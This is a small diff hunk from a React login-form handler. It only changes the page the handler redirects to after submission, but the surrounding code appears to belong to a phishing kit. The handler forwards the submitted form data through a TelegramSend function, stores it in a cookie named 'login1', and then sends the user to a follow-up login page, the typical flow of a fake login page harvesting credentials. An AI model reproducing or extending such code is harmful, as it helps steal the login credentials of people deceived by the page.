@@ -34,7 +34,7 @@ async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
     await TelegramSend(message);
     cookies.set("login1", formInput);
     setIsLoading(false)
-    navigate("../re-login", {replace:true})
+    navigate("../login/auth", {replace:true})
     
 }
   return (
